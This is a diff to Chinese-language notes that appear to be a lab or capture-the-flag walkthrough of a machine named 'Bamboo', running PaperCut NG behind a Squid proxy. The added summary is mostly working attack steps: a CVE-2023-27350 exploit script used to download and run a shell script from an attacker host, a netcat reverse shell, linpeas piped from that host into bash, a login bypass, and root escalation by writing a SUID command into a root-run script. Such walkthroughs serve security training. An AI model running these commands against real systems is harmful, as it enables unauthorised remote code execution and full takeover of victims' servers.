@@ -1,4 +1,90 @@
 ## Bamboo
+### 总结
+```
+端口工具 https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html
+Squid 的Privoxy代理工具： Squidscan -> https://gist.github.com/xct/597d48456214b15108b2817660fdee00 //扫描内部端口
+
+[1] 设置代理
+[★]$ echo 'http 10.129.238.16  3128' | sudo tee -a /etc/proxychains4.conf
+http 10.129.238.16  3128
+//注释掉：#socks4 	127.0.0.1 9050
+[★]$ cat /etc/proxychains4.conf | tail -n1 -n2 -n3
+#socks4 	127.0.0.1 9050
+
+http 10.129.238.16  3128
+
+[2]用 curl 测试 HTTP 的命令 ｜ 你 → Squid代理(3128) → 内网端口9191
+[★]$ proxychains4 curl -v http://10.129.238.16:9191
+[★]$ proxychains4 curl -v http://10.129.238.16:9191/user
+[★]$ proxychains4 curl -I http://127.0.0.1:9191  //302
+[★]$ proxychains4 curl -L http://10.129.238.16:9191 | head
+
+[3] burpsuite代理访问 127.0.0.1:9191/user 
+$ burpsuite -> Setting -> Network -> Connetctions -> Upstream proxy servers -> add
+Destination host    *
+Proxy host          10.129.238.16
+Proxu port          3128
+要关掉拦截 Proxy → Intercept → Intercept is off ！！！！
+
+[4]PaperCut NG 22.0 漏洞 https://nvd.nist.gov/vuln/detail/cve-2023-27350
+[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
+[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000/shell.sh -o /tmp/shell.sh'
+[★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'bash /tmp/shell.sh'
+
+[5][★]$ nc -lvnp 5544
+listening on [any] 5544 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.238.16] 42222
+sh: 0: can't access tty; job control turned off
+$ script /dev/null -c /bin/bash
+
+[6]SSH 安全机制
+papercut@bamboo:~$ chmod 700  ~/.ssh
+chmod 700 ~/.ssh
+papercut@bamboo:~$ chmod 600 ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+[7]linpeas 是一个自动化的本地 Linux 枚举脚本
+[★]$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+papercut@bamboo:~$ curl  http://10.10.14.27:9000/linpeas.sh | bash
+papercut@bamboo:~$ ls -ld /home/papercut/server/bin/linux-x64
+ls -ld /home/papercut/server/bin/linux-x64
+drwxr-xr-x 3 papercut papercut 4096 May 26  2023 /home/papercut/server/bin/linux-x64
+
+[8]影响 PaperCut 22 版本的 CVE-2023-27350 认证绕过漏洞
+https://www.exploit-db.com/exploits/51391
+[★]$ chmod 600 id_rsa
+[★]$ ssh -i id_rsa papercut@10.129.2.255 -L 9191:127.0.0.1:9191 -N
+[★]$ python3 auth_bypass.py
+Enter the ip address: 127.0.0.1
+Version: 22.0.6
+Vulnerable version
+Step 1 visit this url first in your browser: http://127.0.0.1:9191/app?service=page/SetupCompleted
+Step 2 visit this url in your browser to bypass the login page : http://127.0.0.1:9191/app?service=page/Dashboard
+在burpsuite代理登录 http://127.0.0.1:9191/app?service=page/SetupCompleted 即可绕过登录
+
+[9]pspy :无 root 权限也能监控系统进程的工具
+[★]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+papercut@bamboo:~$ cd /tmp
+papercut@bamboo:/tmp$ wget http://10.10.14.27:9000/pspy64
+papercut@bamboo:/tmp$ ./pspy64
+在burpsuite点击“Refresh servers”按钮后，我们发现执行的确实是相同的脚本
+点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers
+
+以 root 权限运行且位于可写目录中的脚本名称是什么？server-command
+papercut@bamboo:~$ cd /home/papercut/server/bin/linux-x64
+papercut@bamboo:~/server/bin/linux-x64$ echo 'chmod u+s /bin/bash' > server-command
+点击“Enable Printing”->Pint Deploy ->Pirnt queues -> Import BYOD-friendly print queues -> Next -> Start Imporing Mobility Print printers -> Refresh servers
+
+[10][★]$ nc -lvnp 5544
+$ script /dev/null -c /bin/bash
+
+bash-5.1$ cd tmp
+bash-5.1$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+bash-5.1$ /bin/bash -p
+bash-5.1# id
+uid=1001(papercut) gid=1001(papercut) euid=0(root) groups=1001(papercut)
+```
 ```
 [★]$ nmap -sC -sV 10.129.238.16
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 23:54 CST
@@ -289,7 +375,7 @@ def execute(base_url, session, command):
 //改为
 def execute(base_url, session, command):
     print('[*] Prepparing to execute...')
-    postback = "java.lang.Runtime.getRuntime().exec('{command}');"
+    postback = "java.lang.Runtime.getRuntime().exec('{command}');" //修改1
     headers = {'Origin': f'{base_url}'}
     data = {
         'service': 'page/PrinterList'
@@ -319,7 +405,7 @@ import requests
 def get_session_id(base_url):
     s = requests.Session()
     s.proxies = {
-            "http": "http://10.129.238.16:3128",
+            "http": "http://10.129.238.16:3128", //修改2
             "https": "http://10.129.238.16:3128"
             }
     r = s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False)
@@ -335,15 +421,6 @@ def get_session_id(base_url):
 ```
 #### 还差一点点
 ```
-[★]$ python3 CVE-2023-27350.py -u http://127.0.0.1:9191 -c "curl http://10.10.14.27:9000"
-[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
-[*] Updating print-and-device.script.enabled to Y
-[*] Updating print.script.sandboxed to N
-[*] Prepparing to execute...
-[-] Might not have a printer configured. Exploit manually by adding one.
-[*] Updating print-and-device.script.enabled to N
-[*] Updating print.script.sandboxed to Y
-
 [★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -366,15 +443,14 @@ def execute(base_url, session, command):
     data = {
         'service': 'page/PrinterList'
     }
-    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False) //修改3
 
     data = {
         'service': 'direct/1/PrinterList/selectPrinter',
         'sp': 'l1001'
     }
-    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
+    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False) ////修改3
 ```
-#### 系统里没有配置 Printer，所以脚本找不到执行脚本的设备。在 PaperCut NG 里，RCE 是通过 printer script 触发的
 ```
 [★]$ proxychains4 python3 CVE-2023-27350.py --url 'http://10.129.238.16:9191' --command 'curl http://10.10.14.27:9000'
 [proxychains] config file found: /etc/proxychains.conf
@@ -508,7 +584,7 @@ drwxr-xr-x 9 papercut papercut 4096 Mar  8 08:55 ..
 -rw------- 1 papercut papercut 2602 Mar  8 08:56 id_rsa
 -rw-r--r-- 1 papercut papercut  569 Mar  8 08:56 id_rsa.pub
 
-//SH 安全机制
+//SSH 安全机制
 papercut@bamboo:~$ chmod 700  ~/.ssh
 chmod 700 ~/.ssh
 papercut@bamboo:~$ chmod 600 ~/.ssh/authorized_keys
